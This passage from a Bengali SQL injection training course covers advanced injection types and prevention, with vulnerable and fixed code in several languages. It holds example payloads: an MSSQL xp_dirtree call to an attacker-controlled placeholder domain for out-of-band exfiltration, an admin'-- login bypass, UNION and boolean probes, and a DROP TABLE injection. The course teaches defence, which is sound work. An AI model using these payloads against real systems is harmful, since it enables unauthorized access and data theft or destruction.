+  <p><strong>এটি কী:</strong> যখন ফলাফল সরাসরি HTTP response-এ দেখা যায় না (এমনকি blind টেকনিকও ব্যবহারযোগ্য না বা অত্যন্ত ধীর), তখন attacker database-কে একটি সম্পূর্ণ আলাদা network চ্যানেল (যেমন DNS বা HTTP request) দিয়ে নিজের কন্ট্রোল করা সার্ভারে ডেটা পাঠাতে বাধ্য করে।</p>
+  <p><strong>কীভাবে কাজ করে:</strong> MSSQL-এ <code>xp_dirtree</code> বা Oracle-এ <code>UTL_HTTP</code>/<code>UTL_INADDR</code>-এর মতো built-in function ব্যবহার করে ডেটাবেস সার্ভার নিজে থেকে একটি বহির্গামী (outbound) DNS lookup বা HTTP request পাঠায়, যার subdomain বা path-এর মধ্যে চুরি করা ডেটা এনকোড করা থাকে।</p>
+  <div class="codeblock"><div class="cb-head"><span>MSSQL OOB ধারণাগত উদাহরণ (শুধুমাত্র নিজের controlled lab domain-এ)</span><button class="copy-btn">কপি</button></div><pre><code>'; EXEC master..xp_dirtree '\\attacker-controlled-domain.example\share'--
+→ যদি DNS resolution লগে দেখা যায়, তাহলে বোঝা যায় stacked query ও
+  network-level OOB সম্ভব। প্রকৃত ডেটা-এক্সফিল্ট্রেশনে subdomain-এর
+  মধ্যে এনকোড করা ডেটা বসানো হয় (যেমন secretvalue.attacker-domain.example)।</code></pre></div>
+  <p><strong>কোন পরিস্থিতিতে উপযোগী:</strong> যখন application-এর response একদমই ডেটা-নিরপেক্ষ (error suppress করা, timing-ও blocked বা অসামঞ্জস্যপূর্ণ) এবং database-এর network-level function-এ access আছে। এটি তুলনামূলক কম দেখা যায়, কারণ অধিকাংশ production database-এ এই ধরনের বহির্গামী নেটওয়ার্ক ফাংশন নিষ্ক্রিয় বা ফায়ারওয়াল-সুরক্ষিত থাকে।</p>
+  <p><strong>Fix:</strong> Parameterized query মূল সমাধান; এছাড়া database সার্ভার থেকে বহির্গামী নেটওয়ার্ক কল (DNS, HTTP) ফায়ারওয়াল দিয়ে ব্লক করা একটি গুরুত্বপূর্ণ defense-in-depth স্তর।</p>
+
+  <!-- ============ 9. SECOND-ORDER ============ -->
+  <h2 id="second-order">৯. Second-Order SQL Injection</h2>
+  <p><strong>এটি কী:</strong> Second-order SQLi-তে malicious input তাৎক্ষণিকভাবে কোনো query-তে ব্যবহৃত হয় না — বরং প্রথমে নিরাপদভাবে (parameterized আকারে) database-এ সংরক্ষিত হয়, এবং <em>পরে</em>, একটি সম্পূর্ণ ভিন্ন ফিচারে, সেই সংরক্ষিত মান যখন un-sanitized অবস্থায় একটি নতুন query তৈরিতে ব্যবহৃত হয়, তখন injection ঘটে।</p>
+  <p><strong>কেন ঘটে:</strong> ডেভেলপাররা প্রায়ই ধরে নেন যে database থেকে পড়া ডেটা "ইতিমধ্যে নিরাপদ" — কিন্তু আসল নিরাপত্তা নির্ভর করে ডেটা কীভাবে <em>ব্যবহৃত</em> হচ্ছে তার উপর, কোথা থেকে এলো তার উপর নয়।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ — ShopMock রেজিস্ট্রেশন ও প্রোফাইল আপডেট ফিচার</span><button class="copy-btn">কপি</button></div><pre><code>ধাপ ১: রেজিস্ট্রেশনে username হিসেবে পাঠানো হলো:  alamin'--
+       → parameterized INSERT দিয়ে নিরাপদে সংরক্ষিত হলো (কোনো injection হয়নি এখানে)
+
+ধাপ ২: পরে, "প্রোফাইল সম্পাদনা" ফিচারে, backend কোড ভুলভাবে
+       stored username আবার string-concatenation দিয়ে একটি নতুন
+       query-তে ব্যবহার করলো:
+       "UPDATE profile SET bio = '...' WHERE username = '" + storedUsername + "'"
+       → এখন stored 'alamin'-- মান injection ঘটায়, যদিও মূল ইনপুট
+         আসার সময় কোনো সমস্যা ধরা পড়েনি।</code></pre></div>
+  <p><strong>Manual testing-এর কৌশল:</strong> শুধুমাত্র input পয়েন্টে টেস্ট করলে second-order ধরা পড়ে না — পুরো ডেটা flow ম্যাপ করতে হয়: কোথায় ডেটা প্রথম সংরক্ষিত হয়, এবং এরপর অ্যাপ্লিকেশনের কোন কোন জায়গায় সেই ডেটা পুনরায় পড়া ও query-তে ব্যবহার করা হয়।</p>
+  <p><strong>Common false positives:</strong> যেহেতু trigger ও effect আলাদা জায়গায়/সময়ে ঘটে, তাই causation প্রমাণ করা কঠিন — একই পরীক্ষা বারবার (store → trigger অন্য ফিচার → পর্যবেক্ষণ) পুনরাবৃত্তি করে নিশ্চিত হতে হবে।</p>
+  <p><strong>Impact ও fix:</strong> Impact normal SQLi-এর মতোই গুরুতর হতে পারে, কিন্তু আবিষ্কার করা কঠিন বলে প্রায়ই দীর্ঘদিন অলক্ষিত থাকে। Fix: প্রতিটি query-তে — ডেটা নতুন ইনপুট হোক বা database থেকে পড়া — সবসময় parameterized query ব্যবহার করা, "already trusted" বলে কোনো ডেটা উৎসকে বিশেষ ছাড় না দেওয়া।</p>
+
+  <!-- ============ 10. AUTHENTICATION-RELATED ============ -->
+  <h2 id="auth-related">১০. Authentication-Related SQL Injection</h2>
+  <p><strong>এটি কী:</strong> এটি একটি নির্দিষ্ট প্রয়োগক্ষেত্র, যেখানে উপরের যেকোনো টেকনিক (সাধারণত error-based বা boolean-based) ব্যবহার করে login/authentication query-কে প্রভাবিত করে authentication বাইপাস করা হয়।</p>
+  <div class="codeblock"><div class="cb-head"><span>ক্লাসিক উদাহরণ (অধ্যায় ০২-এর সম্প্রসারণ)</span><button class="copy-btn">কপি</button></div><pre><code>Query: SELECT * FROM users WHERE username = '{u}' AND password = '{p}'
+
+Input username:  admin'--
+Input password:  (যেকোনো কিছু)
+Resulting query: SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
+→ "--" এর পরের অংশ comment হয়ে যায়, ফলে শুধু username='admin'
+  যাচাই হয়, password যাচাই বাদ পড়ে যায়।</code></pre></div>
+  <p><strong>Database-specific comment syntax গুরুত্বপূর্ণ:</strong> MySQL/PostgreSQL-এ <code>--</code> (স্পেসসহ) বা <code>#</code> (শুধু MySQL), MSSQL-এ <code>--</code>। সঠিক comment syntax না জানলে payload কাজ নাও করতে পারে।</p>
+  <p><strong>সম্ভাব্য false positives:</strong> লগইন ব্যর্থ হওয়ার সাধারণ কারণ (ভুল পাসওয়ার্ড) থেকে প্রকৃত bypass আলাদা করতে হবে — শুধুমাত্র সফল session/token তৈরি হওয়াই প্রকৃত প্রমাণ, নিছক ভিন্ন error message নয়।</p>
+  <p><strong>Impact:</strong> সরাসরি account takeover বা admin-level access — তাই সাধারণত Critical severity। <strong>Fix:</strong> parameterized query, পাশাপাশি password যাচাই application-layer-এ hash তুলনা দিয়ে করা (শুধু SQL condition-এর উপর নির্ভর না করা)।</p>
+
+  <!-- ============ 11 & 12. NUMERIC / STRING CONTEXT ============ -->
+  <h2 id="numeric-string-context">১১–১২. Numeric-Context ও String-Context SQL Injection</h2>
+  <p>অধ্যায় ০২-এ আমরা দেখেছি query context গুরুত্বপূর্ণ কেন। এখানে দুটি context-ই পাশাপাশি তুলনা করে দেখানো হলো, কারণ payload-এর গঠন context-নির্ভর।</p>
+  <h3>Numeric context</h3>
+  <p>যখন parameter সরাসরি সংখ্যা হিসেবে ব্যবহৃত হয় (কোনো quote ছাড়া), যেমন <code>WHERE id = 7</code>। এখানে quote বন্ধ করার দরকার নেই — সরাসরি operator/keyword যোগ করা যায়:</p>
+  <div class="codeblock"><pre><code>?id=7 AND 1=1--      (true)
+?id=7 AND 1=2--      (false)
+?id=7 UNION SELECT ...</code></pre></div>
+  <h3>String context</h3>
+  <p>যখন parameter একটি quoted string-এর ভেতরে বসে, যেমন <code>WHERE name = 'ইনপুট'</code>। এখানে প্রথমে quote বন্ধ করতে হবে, তারপর payload যোগ করতে হবে, এবং প্রয়োজনে পরবর্তী quote-কেও সামলাতে হবে:</p>
+  <div class="codeblock"><pre><code>?name=x' AND '1'='1
+?name=x' AND '1'='2
+?name=x' UNION SELECT NULL,NULL--</code></pre></div>
+  <p><strong>সাধারণ ভুল:</strong> string context-এর জন্য তৈরি payload (quote-সহ) numeric context-এ পাঠালে, সেটি numeric query-তে একটি অপ্রত্যাশিত quote যোগ করে এবং বরং error সৃষ্টি করে বা কাজই করে না — তাই আগে context নির্ধারণ করা, তারপর সেই অনুযায়ী payload বাছাই করা জরুরি। <strong>Fix (উভয় context-এর জন্য):</strong> parameterized query — তখন context যাই হোক, driver নিজে সঠিকভাবে bind করে।</p>
+
+  <!-- ============ 13. ORDER BY / CLAUSE INJECTION ============ -->
+  <h2 id="orderby-clause">১৩. ORDER BY ও অন্যান্য SQL Clause-এ Injection</h2>
+  <p><strong>এটি কী:</strong> Sorting ফিচারে ইউজার প্রায়ই কলামের নাম বা দিক (<code>ASC</code>/<code>DESC</code>) নির্বাচন করে — এটি <code>ORDER BY</code> clause-এ সরাসরি বসে। যেহেতু এটি একটি identifier/keyword position (ডেটা ভ্যালু নয়), parameterized query দিয়ে সরাসরি সুরক্ষিত করা যায় না।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>GET /products?sort=price
+Query: SELECT * FROM products ORDER BY price
+
+Test: GET /products?sort=price,(SELECT CASE WHEN (1=1) THEN price ELSE name END)
+→ এরকম conditional expression দিয়ে boolean-based blind inference
+  করা সম্ভব, এমনকি ORDER BY-এর মতো "non-data" position-এও।</code></pre></div>
+  <p><strong>বিশেষত্ব:</strong> যেহেতু এখানে parameterization প্রযোজ্য না, তাই এই অবস্থানটি প্রায়ই allowlist validation ছাড়া ছেড়ে দেওয়া হয় — এবং developer-রা প্রায়ই ভুলে যান যে এটি একটি injection point হতে পারে, কারণ এটি "শুধু sorting" মনে হয়।</p>
+  <p><strong>Common false positive:</strong> অবৈধ sort value দিলে অনেক framework ডিফল্ট sort-এ ফিরে যায় (silent fallback) — এটি vulnerability-এর অভাব বোঝাতে পারে, অথবা শুধু robust error-handling বোঝাতে পারে; নিশ্চিত হতে conditional expression দিয়ে true/false পার্থক্য যাচাই করা দরকার। <strong>Fix:</strong> allowlist — শুধুমাত্র পূর্বনির্ধারিত কলাম নাম ও <code>ASC</code>/<code>DESC</code> গ্রহণ করা (অধ্যায় ১৭ দেখুন)।</p>
+
+  <!-- ============ 14. STORED PROCEDURE ============ -->
+  <h2 id="stored-procedure">১৪. Stored Procedure-সংক্রান্ত SQL Injection</h2>
+  <p><strong>এটি কী:</strong> Stored procedure হলো database-এর ভেতরে আগে থেকে সংরক্ষিত একটি SQL রুটিন, যা application কল করে। সাধারণ ধারণা থাকে stored procedure ব্যবহার করলেই SQLi থেকে সুরক্ষিত — কিন্তু procedure-এর ভেতরে যদি <strong>dynamic SQL</strong> (parameter-কে string হিসেবে জোড়া লাগিয়ে আরেকটি query বানানো, যেমন MSSQL-এর <code>EXEC</code>/<code>sp_executesql</code>) ব্যবহৃত হয়, তাহলে injection তখনও সম্ভব।</p>
+  <div class="codeblock"><div class="cb-head"><span>Vulnerable stored procedure (ধারণাগত, MSSQL)</span><button class="copy-btn">কপি</button></div><pre><code>CREATE PROCEDURE SearchProducts @category NVARCHAR(100)
+AS
+BEGIN
+  DECLARE @sql NVARCHAR(MAX)
+  SET @sql = 'SELECT * FROM products WHERE category = ''' + @category + ''''
+  EXEC(@sql)   -- এখানেই সমস্যা: @category string concatenation দিয়ে query-তে বসছে
+END</code></pre></div>
+  <p><strong>Evidence:</strong> Procedure নিজে parameter গ্রহণ করে বলে উপরি-উপরি নিরাপদ মনে হতে পারে, কিন্তু ভেতরের <code>EXEC(@sql)</code>-এর ফলে একই ক্লাসিক string-context injection ঘটে, যা আগের টেকনিকগুলো দিয়েই শনাক্ত করা যায়। <strong>Fix:</strong> procedure-এর ভেতরেও parameterized/<code>sp_executesql</code> with parameters ব্যবহার করা — কখনো raw string concatenation দিয়ে dynamic SQL না বানানো।</p>
+
+  <!-- ============ 15. ORM ============ -->
+  <h2 id="orm-injection">১৫. ORM ও Query-Construction-সংক্রান্ত SQL Injection</h2>
+  <p><strong>এটি কী:</strong> আধুনিক ফ্রেমওয়ার্কে ORM (Object-Relational Mapping) — যেমন Django ORM, SQLAlchemy, Sequelize, Hibernate — ব্যবহার করা হয়, যা সাধারণত নিজে থেকেই parameterized query তৈরি করে। তবে প্রায় প্রতিটি ORM-এ একটি "raw/native query" escape hatch থাকে, এবং সেখানে ডেভেলপার যদি ভুলভাবে string concatenation/f-string ব্যবহার করেন, তাহলে ORM ব্যবহার সত্ত্বেও SQLi তৈরি হয়।</p>
+  <div class="codeblock"><div class="cb-head"><span>Django ORM — vulnerable বনাম safe raw query</span><button class="copy-btn">কপি</button></div><pre><code># ❌ vulnerable — .raw() এর ভেতরে string formatting
+User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
+
+# ✅ safe — .raw() এর নিজস্ব parameter placeholder ব্যবহার করে
+User.objects.raw("SELECT * FROM users WHERE username = %s", [username])
+
+# ✅✅ সবচেয়ে ভালো — ORM-এর নিজস্ব query API ব্যবহার করা (raw() এড়িয়ে চলা)
+User.objects.filter(username=username)</code></pre></div>
+  <p><strong>কোথায় খুঁজবেন:</strong> কোডবেসে <code>.raw(</code>, <code>.query(</code>, <code>executeQuery(</code>, <code>$queryRaw</code>-জাতীয় মেথড কল এবং তার ভেতরে কোথাও string concatenation/template literal/f-string আছে কি না — এগুলোই review-এর অগ্রাধিকার তালিকা। <strong>Impact ও fix:</strong> সাধারণ SQLi-এর মতোই; fix হলো raw query-তেও parameterization বজায় রাখা, অথবা যেখানে সম্ভব ORM-এর স্বাভাবিক (non-raw) API ব্যবহার করা।</p>
+
+  <!-- ============ 16. JSON/API ============ -->
+  <h2 id="json-api-injection">১৬. JSON/API Parameter-এ SQL Injection</h2>
+  <p><strong>এটি কী:</strong> আধুনিক অ্যাপ্লিকেশন প্রায়ই ফর্ম-এনকোডেড ডেটার বদলে JSON request body ব্যবহার করে। অনেক ডেভেলপার ভুলভাবে মনে করেন JSON ফরম্যাট নিজেই কোনো সুরক্ষা দেয় — কিন্তু JSON শুধু ডেটা পাঠানোর একটি ফরম্যাট মাত্র; backend সেই ভ্যালু কীভাবে query-তে ব্যবহার করছে সেটাই গুরুত্বপূর্ণ।</p>
+  <div class="codeblock"><div class="cb-head"><span>উদাহরণ</span><button class="copy-btn">কপি</button></div><pre><code>POST /api/search
+Content-Type: application/json
+
+{"category": "electronics'; DROP TABLE logs--"}
+
+→ যদি backend এই category ভ্যালু string-concatenation দিয়ে query-তে
+  বসায়, তাহলে JSON ফরম্যাট ব্যবহার সত্ত্বেও injection ঘটবে — ঠিক
+  form-field-এর মতোই।</code></pre></div>
+  <p><strong>বিশেষ বিবেচ্য বিষয়:</strong> JSON-এ nested object/array থাকতে পারে (যেমন <code>filters: [{"field": "price", "op": ">", "value": 100}]</code>) — এখানে <code>field</code> ও <code>op</code> প্রায়ই সরাসরি কলাম নাম/অপারেটর হিসেবে ব্যবহৃত হয়, যা ORDER BY-এর মতোই allowlist-নির্ভর সুরক্ষা দাবি করে। <strong>Fix:</strong> JSON parsing-এর পরেও, প্রতিটি মান query-তে ব্যবহারের আগে একই parameterization/allowlist নিয়ম প্রযোজ্য — ফরম্যাট যাই হোক না কেন।</p>
+
+  <!-- ============ 17. SEARCH/FILTER/SORT ============ -->
+  <h2 id="search-filter-sort">১৭. Search, Filter ও Sorting Functionality-তে SQL Injection</h2>
+  <p><strong>এটি কী:</strong> সার্চ/ফিল্টার/সর্টিং ফিচার প্রায়ই একাধিক parameter একত্র করে একটি জটিল, dynamically-built query তৈরি করে (যেমন একাধিক <code>WHERE</code> শর্ত <code>AND</code>/<code>OR</code> দিয়ে জোড়া লাগানো), যা injection-এর জন্য একটি সমৃদ্ধ ক্ষেত্র তৈরি করে।</p>
+  <div class="codeblock"><div class="cb-head"><span>ShopMock অ্যাডভান্সড সার্চ — একাধিক parameter</span><button class="copy-btn">কপি</button></div><pre><code>GET /search?q=laptop&min_price=500&max_price=2000&sort=price&dir=asc
+
+ধারণাগত backend (vulnerable):
+query = "SELECT * FROM products WHERE name LIKE '%" + q + "%'
+         AND price BETWEEN " + min_price + " AND " + max_price + "
+         ORDER BY " + sort + " " + dir
+
+→ এখানে ৫টি ভিন্ন parameter, ৩টি ভিন্ন context (string LIKE, numeric,
+  identifier/clause) একসাথে মিশে আছে — প্রতিটি আলাদাভাবে টেস্ট করা জরুরি।</code></pre></div>
+  <p><strong>Manual testing-এর কৌশল:</strong> একবারে একটি parameter পরিবর্তন করুন, বাকিগুলো বেসলাইন মান রাখুন (অধ্যায় ০৬-এর controlled-testing নীতি) — একসাথে একাধিক parameter বদলালে কোনটি আসলে প্রভাব ফেলছে তা বোঝা কঠিন হয়ে যায়। <code>LIKE</code> operator-এর ক্ষেত্রে বিশেষভাবে <code>%</code> ও <code>_</code> wildcard বিবেচনায় রাখুন, কারণ এগুলোও SQL-এর বিশেষ অক্ষর।</p>
+  <p><strong>Impact ও fix:</strong> যেকোনো একটি দুর্বল parameter-ই পুরো query-কে ঝুঁকিপূর্ণ করে তোলে। প্রতিটি ডেটা-ভ্যালু parameter (q, min_price, max_price) parameterize করতে হবে, আর identifier parameter (sort, dir) allowlist দিয়ে সীমাবদ্ধ করতে হবে।</p>
+
+  <div class="qa">
+    <h3>Knowledge-check</h3>
+    <ol>
+      <li>Error-based ও boolean-based blind SQLi-এর মধ্যে মূল পার্থক্য কী?</li>
+      <li>UNION-based attack-এ column count মেলানো কেন জরুরি?</li>
+      <li>Time-based blind টেকনিকে কেন একাধিকবার measurement নেওয়া প্রয়োজন?</li>
+      <li>Stacked queries সব database-এ সমানভাবে কাজ করে না কেন?</li>
+    
+      <li>Second-order SQLi কেন সাধারণ টেস্টিং পদ্ধতিতে ধরা পড়ে না?</li>
+      <li>In-band ও out-of-band SQLi-এর মধ্যে মূল পার্থক্য কী?</li>
+      <li>ORDER BY clause-এ parameterized query কেন সরাসরি প্রয়োগ করা যায় না?</li>
+      <li>JSON body ব্যবহার করলে কি SQLi ঝুঁকি কমে? ব্যাখ্যা করুন।</li>
+    </ol>
+  </div>
+
+  <div class="pager">
+    <a class="prev" href="/chapter02"><span>পূর্ববর্তী</span>অধ্যায় ০২</a>
+    <a class="next" href="/chapter04"><span>পরবর্তী</span>অধ্যায় ০৪ — কোথায় Test করতে হয়</a>
+  </div>
+</section>
+
+<!-- =========================================================
+     CHAPTER 17
+========================================================= -->
+<section class="chapter" id="ch17">
+  <div class="eyebrow">অধ্যায় ১৭ · প্রতিরক্ষা</div>
+  <h1>SQL Injection Prevention</h1>
+  <p class="sub">SQLi ঠেকানোর মূল ভিত্তি হলো কোড লেখার অভ্যাস — এখানে Python, PHP, Node.js, Java ও C#-এর vulnerable ও fixed উদাহরণ লাইন-বাই-লাইন ব্যাখ্যাসহ দেওয়া হলো।</p>
+  <div class="mark-done-row"><input type="checkbox" data-ch="ch17" id="done-ch17"><label for="done-ch17">এই অধ্যায় সম্পন্ন হিসেবে চিহ্নিত করুন</label></div>
+
+  <h2>Prepared Statements ও Parameterized Queries — মূল সমাধান</h2>
+  <p><strong>কী এবং কেন:</strong> Parameterized query-তে SQL statement-এর গঠন (structure) এবং ইউজার-ইনপুট (ডেটা) সম্পূর্ণ আলাদা দুইটি চ্যানেল দিয়ে database-এ পাঠানো হয়। Database driver প্রথমে query-এর "টেমপ্লেট" (placeholder <code>?</code> বা named parameter সহ) পাঠায়, তারপর আলাদাভাবে প্রতিটি মান পাঠায়। এর ফলে, ইউজার যতই <code>' OR '1'='1</code>-এর মতো টেক্সট পাঠাক না কেন, database সেটিকে কখনোই SQL syntax হিসেবে interpret করবে না — এটি সবসময় শুধুই একটি স্ট্রিং মান হিসেবে গণ্য হবে।</p>
+
+  <div class="callout info"><div class="ic">ℹ️</div><p><strong>Parameterized query দিয়ে কী সুরক্ষিত হয় না:</strong> এটি শুধু ডেটা ভ্যালুকে (যেমন <code>WHERE username = ?</code>) সুরক্ষিত করে। এটি dynamic table/column name বা <code>ORDER BY</code> দিক (ASC/DESC)-কে সুরক্ষিত করে না, কারণ এগুলো SQL-এর identifier/syntax অংশ — parameter হিসেবে bind করা যায় না। এর জন্য আলাদাভাবে allowlist ব্যবহার করতে হয় (নিচে দেখুন)।</p></div>
+
+  <h3>Python (ভুল বনাম সঠিক)</h3>
+  <div class="codeblock">
+    <div class="cb-head"><span>❌ vulnerable.py</span><button class="copy-btn">কপি</button></div>
+    <pre><code># লাইন ১: ইউজার ইনপুট সরাসরি নেওয়া হচ্ছে
+username = request.form["username"]
+
+# লাইন ২-৩: f-string দিয়ে query তৈরি — ইনপুট সরাসরি query-এর ভেতর বসছে
+query = f"SELECT * FROM users WHERE username = '{username}'"
+cursor.execute(query)
+# সমস্যা: username-এ single quote থাকলে query-এর গঠন বদলে যাবে</code></pre>
+  </div>
+  <div class="codeblock">
+    <div class="cb-head"><span>✅ fixed.py</span><button class="copy-btn">কপি</button></div>
+    <pre><code># লাইন ১: একই ইনপুট নেওয়া
+username = request.form["username"]
+
+# লাইন ২-৩: placeholder (%s) ব্যবহার, ইনপুট আলাদা tuple আকারে পাঠানো হচ্ছে
+query = "SELECT * FROM users WHERE username = %s"
+cursor.execute(query, (username,))
+# driver নিজে input-কে escape/bind করে — কখনোই query syntax-এর অংশ হয় না</code></pre>
+  </div>
+
+  <h3>PHP (PDO)</h3>
+  <div class="codeblock">
+    <div class="cb-head"><span>❌ vulnerable.php</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: GET parameter সরাসরি নেওয়া হচ্ছে
+$id = $_GET['id'];
+
+// লাইন ২-৩: string concatenation দিয়ে query তৈরি
+$query = "SELECT * FROM products WHERE id = " . $id;
+$result = $pdo->query($query);
+// সমস্যা: $id numeric context হলেও কোনো যাচাই/parameterization নেই</code></pre>
+  </div>
+  <div class="codeblock">
+    <div class="cb-head"><span>✅ fixed.php</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: একই ইনপুট নেওয়া
+$id = $_GET['id'];
+
+// লাইন ২: named placeholder সহ prepared statement তৈরি
+$stmt = $pdo->prepare("SELECT * FROM products WHERE id = :id");
+
+// লাইন ৩: ইনপুট আলাদাভাবে bind ও execute করা হচ্ছে
+$stmt->execute(['id' => $id]);
+// PDO ড্রাইভার এখানে type-aware বাইন্ডিং করে, query আলাদা থাকে</code></pre>
+  </div>
+
+  <h3>Node.js (node-postgres)</h3>
+  <div class="codeblock">
+    <div class="cb-head"><span>❌ vulnerable.js</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: request body থেকে ইনপুট
+const email = req.body.email;
+
+// লাইন ২-৩: template literal দিয়ে query তৈরি — injection-এর ক্লাসিক pattern
+const query = `SELECT * FROM users WHERE email = '${email}'`;
+const result = await pool.query(query);</code></pre>
+  </div>
+  <div class="codeblock">
+    <div class="cb-head"><span>✅ fixed.js</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: একই ইনপুট
+const email = req.body.email;
+
+// লাইন ২: $1 পজিশনাল placeholder ব্যবহার
+const query = "SELECT * FROM users WHERE email = $1";
+
+// লাইন ৩: values array আলাদাভাবে পাঠানো হচ্ছে
+const result = await pool.query(query, [email]);
+// pg ড্রাইভার query ও values কে আলাদা protocol message হিসেবে পাঠায়</code></pre>
+  </div>
+
+  <h3>Java (JDBC)</h3>
+  <div class="codeblock">
+    <div class="cb-head"><span>❌ Vulnerable.java</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: পরামিতি হিসেবে আসা ইনপুট
+String category = request.getParameter("category");
+
+// লাইন ২-৩: Statement + string concatenation
+Statement stmt = connection.createStatement();
+ResultSet rs = stmt.executeQuery(
+    "SELECT * FROM products WHERE category = '" + category + "'");</code></pre>
+  </div>
+  <div class="codeblock">
+    <div class="cb-head"><span>✅ Fixed.java</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: একই ইনপুট
+String category = request.getParameter("category");
+
+// লাইন ২: PreparedStatement-এ placeholder (?) ব্যবহার
+PreparedStatement stmt = connection.prepareStatement(
+    "SELECT * FROM products WHERE category = ?");
+
+// লাইন ৩: ইনপুট টাইপ-নির্দিষ্টভাবে bind করা
+stmt.setString(1, category);
+ResultSet rs = stmt.executeQuery();
+// JDBC driver এখানে category-কে কখনো SQL token হিসেবে parse করবে না</code></pre>
+  </div>
+
+  <h3>C# (ADO.NET)</h3>
+  <div class="codeblock">
+    <div class="cb-head"><span>❌ Vulnerable.cs</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: query string থেকে ইনপুট
+string username = Request.Query["username"];
+
+// লাইন ২-৩: string interpolation দিয়ে query তৈরি
+string sql = $"SELECT * FROM Users WHERE Username = '{username}'";
+var cmd = new SqlCommand(sql, connection);</code></pre>
+  </div>
+  <div class="codeblock">
+    <div class="cb-head"><span>✅ Fixed.cs</span><button class="copy-btn">কপি</button></div>
+    <pre><code>// লাইন ১: একই ইনপুট
+string username = Request.Query["username"];
+
+// লাইন ২: @-prefixed named parameter সহ query
+string sql = "SELECT * FROM Users WHERE Username = @username";
+var cmd = new SqlCommand(sql, connection);
+
+// লাইন ৩: parameter আলাদাভাবে যোগ করা হচ্ছে
+cmd.Parameters.AddWithValue("@username", username);
+// SqlCommand ইনপুটকে ডেটা হিসেবে পাঠায়, কখনো query text-এ জোড়া লাগায় না</code></pre>
+  </div>
+
+  <h2>Dynamic Table/Column Name-এর নিরাপদ Allowlist</h2>
+  <p>যখন sorting বা filtering ফিচারে ইউজার কলামের নাম নির্বাচন করতে পারে (যেমন <code>?sort=price</code>), তখন parameterized query দিয়ে কলামের নাম bind করা যায় না — কারণ SQL-এ identifier parameter হিসেবে পাঠানো সম্ভব না। সমাধান হলো একটি নির্দিষ্ট, পূর্বনির্ধারিত তালিকার (allowlist) বাইরে কোনো মান গ্রহণ না করা:</p>
+  <div class="codeblock">
+    <div class="cb-head"><span>Allowlist প্যাটার্ন (ধারণাগত)</span><button class="copy-btn">কপি</button></div>
+    <pre><code>allowed_columns = {"price", "name", "created_at"}
+requested = user_input_sort_column
+
+if requested not in allowed_columns:
+    raise InvalidInputError("অবৈধ sort column")
+
+query = f"SELECT * FROM products ORDER BY {requested}"  # এখন নিরাপদ,
+# কারণ requested শুধুমাত্র পূর্বনির্ধারিত, কোড-নিয়ন্ত্রিত মান হতে পারে</code></pre>
+  </div>
+
+  <h2>ORM-এর নিরাপদ ব্যবহার</h2>
+  <p>Django ORM, SQLAlchemy, Sequelize, Hibernate-এর মতো ORM সাধারণত ডিফল্টভাবে parameterized query তৈরি করে, তাই নিরাপদ। কিন্তু প্রায় প্রতিটি ORM-এ একটি "raw query" বা "escape hatch" থাকে (যেমন Django-এর <code>.raw()</code>, Sequelize-এর <code>.query()</code>), যেখানে ডেভেলপার যদি string concatenation ব্যবহার করে, তাহলে ORM ব্যবহার করা সত্ত্বেও vulnerability তৈরি হতে পারে। তাই ORM ব্যবহার করলেই "স্বয়ংক্রিয়ভাবে নিরাপদ" ধরে নেওয়া ভুল — raw/native query অংশগুলো আলাদাভাবে review করা দরকার।</p>
+
+  <h2>Stored Procedure-এর নিরাপদ ব্যবহার</h2>
+  <p>Stored procedure নিজে থেকেই SQLi থেকে সুরক্ষা দেয় না — যদি procedure-এর ভেতরে dynamic SQL (<code>EXEC</code>, <code>sp_executesql</code> + string concatenation) ব্যবহার করা হয়, তাহলে procedure-এর ভেতরেও injection সম্ভব। Stored procedure-এর parameter নিজে parameterized হলেও, procedure নিজের ভেতরে কীভাবে সেই parameter ব্যবহার করছে তা গুরুত্বপূর্ণ।</p>
+
+  <h2>Input Validation</h2>
+  <p>Input validation (যেমন email ফরম্যাট, সংখ্যা শুধু সংখ্যা কি না যাচাই করা) একটি ভালো <strong>অতিরিক্ত</strong> defense layer, কিন্তু এটি কখনোই parameterized query-এর বিকল্প নয় — কারণ validation রুল প্রায়ই অসম্পূর্ণ বা bypass-যোগ্য হতে পারে (যেমন Unicode normalization-এর কারণে)। Defense-in-depth হিসেবে উভয়ই ব্যবহার করা উচিত।</p>
+
+  <h2>Output Encoding কেন SQLi-এর মূল সমাধান নয়</h2>
+  <p>Output encoding (যেমন HTML entity encoding) XSS প্রতিরোধে কার্যকর, কিন্তু SQLi একটি সম্পূর্ণ ভিন্ন সমস্যা — এখানে ইনপুট output হিসেবে ব্রাউজারে render হওয়ার আগেই backend query-তে ক্ষতি করে ফেলে। তাই output encoding SQLi-এর জন্য প্রাসঙ্গিক নয়; input/query-layer সমাধানই (parameterization) দরকার।</p>
+
+  <h2>Least-Privilege Database Accounts</h2>
+  <p>Application যে database account দিয়ে সংযুক্ত হয়, সেটিকে শুধুমাত্র প্রয়োজনীয় ন্যূনতম privilege দেওয়া উচিত। যেমন একটি read-only reporting ফিচারের জন্য এমন একটি account ব্যবহার করা উচিত যার <code>DROP</code>, <code>DELETE</code>, বা অন্য টেবিলে access নেই। এর ফলে, কোনো কারণে SQLi ঘটলেও attacker-এর সম্ভাব্য ক্ষতি (blast radius) সীমিত থাকে।</p>
+
+  <h2>Safe Error Handling</h2>
+  <p>Production পরিবেশে কখনোই raw database error message ইউজারকে দেখানো উচিত না। এর বদলে generic error message ("কিছু একটা ভুল হয়েছে") দেখিয়ে, বিস্তারিত error শুধুমাত্র server-side log-এ রাখা উচিত।</p>
+
+  <h2>Secret Management ও Logging</h2>
